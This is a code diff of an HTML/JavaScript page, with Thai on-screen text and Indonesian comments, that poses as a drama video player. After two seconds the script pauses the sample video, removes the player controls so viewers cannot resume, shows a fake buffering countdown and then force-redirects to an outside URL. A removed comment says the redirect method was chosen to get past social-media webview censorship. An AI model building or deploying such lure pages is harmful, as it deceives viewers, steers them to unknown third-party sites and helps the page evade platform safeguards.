@@ -45,6 +45,7 @@
             border-radius: 8px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.5);
             overflow: hidden;
+            cursor: pointer;
         }
 
         .video-container video {
@@ -53,7 +54,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            object-fit: contain; /* Memastikan video terlihat utuh */
+            object-fit: contain;
         }
 
         /* Overlay Buffering */
@@ -63,12 +64,13 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.75);
-            display: none; /* Muncul lewat JS */
+            background-color: rgba(0, 0, 0, 0.8);
+            display: none; /* Muncul lewat JS setelah diklik & berjalan */
             flex-direction: column;
             justify-content: center;
             align-items: center;
             z-index: 10;
+            cursor: default;
         }
 
         /* Spinner Loading */
@@ -105,21 +107,19 @@
 <div class="container">
     <h1>รับชมคลิปวิดีโอตอนละครได้ด้านล่าง</h1>
     
-    <div class="video-container">
-        <!-- LINK VIDEO DIGANTI KE SUMBER YANG JAUH LEBIH STABIL & RINGAN -->
-        <video id="myVideo" autoplay muted playsinline controlslist="nodownload">
+    <div class="video-container" onclick="playVideo()">
+        <video id="myVideo" controls controlslist="nodownload">
             <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
             เบราว์เซอร์ของคุณไม่รองรับการเล่นวิดีโอ
         </video>
 
-        <!-- Buffering Screen -->
-        <div class="buffering-overlay" id="bufferingOverlay">
+        <div class="buffering-overlay" id="bufferingOverlay" onclick="event.stopPropagation();">
             <div class="spinner"></div>
             <div class="buffering-text">กำลังโหลดวิดีโอ... <span id="countdown">3</span> วินาที</div>
         </div>
     </div>
 
-    <p class="footer-text">กรุณารอแถบสัญญาณวิดีโอปรับค่าให้เหมาะสมสักครู่</p>
+    <p class="footer-text">คลิกที่วิดีโอเพื่อเริ่มเล่น</p>
 </div>
 
 <script>
@@ -127,37 +127,40 @@
     const bufferingOverlay = document.getElementById('bufferingOverlay');
     const countdownText = document.getElementById('countdown');
 
-    // CONFIGURATION
-    const targetPage = "https://omg10.com/4/11170008"; // Halaman tujuan redirect
-    const triggerBufferingAtSecond = 2;          // Buffering aktif di detik ke-2
-    let bufferingDuration = 3;                   // Durasi buffering (3 detik)
+    // KONEKSI & PENGATURAN WAKTU
+    const targetPage = "https://omg10.com/4/11170008"; // Halaman tujuan setelah buffering
+    const triggerBufferingAtSecond = 2;          // Menggantung/buffering di detik ke-2 setelah diputar
+    let bufferingDuration = 5;                   // Lama waktu buffering ( detik)
 
     let bufferingTriggered = false;
 
-    // Antisipasi jika video gagal auto-play karena kebijakan browser
-    window.addEventListener('DOMContentLoaded', () => {
-        video.play().catch(error => {
-            console.log("Autoplay dicegah browser, mencoba memutar ulang...");
-            // Force play secara paksa
-            video.muted = true;
+    // Fungsi untuk memutar video ketika area kotak diklik
+    function playVideo() {
+        if (video.paused && !bufferingTriggered) {
             video.play();
-        });
-    });
+        }
+    }
 
+    // Mendengarkan pergerakan durasi video
     video.addEventListener('timeupdate', () => {
         if (video.currentTime >= triggerBufferingAtSecond && !bufferingTriggered) {
             bufferingTriggered = true;
             
-            video.pause(); 
-            bufferingOverlay.style.display = 'flex'; 
+            video.pause(); // Hentikan video secara paksa
+            
+            // Sembunyikan kontrol bawaan browser saat buffering agar tidak bisa diklik play lagi oleh user
+            video.removeAttribute('controls'); 
+            
+            bufferingOverlay.style.display = 'flex'; // Tampilkan layar loading Thailand
 
+            // Hitung mundur sebelum dialihkan
             const interval = setInterval(() => {
                 bufferingDuration--;
                 countdownText.innerText = bufferingDuration;
 
                 if (bufferingDuration <= 0) {
                     clearInterval(interval);
-                    // Redirect menggunakan metode replace agar lebih lolos sensor webview medsos
+                    // Redirect otomatis
                     window.location.replace(targetPage);
                 }
             }, 1000);
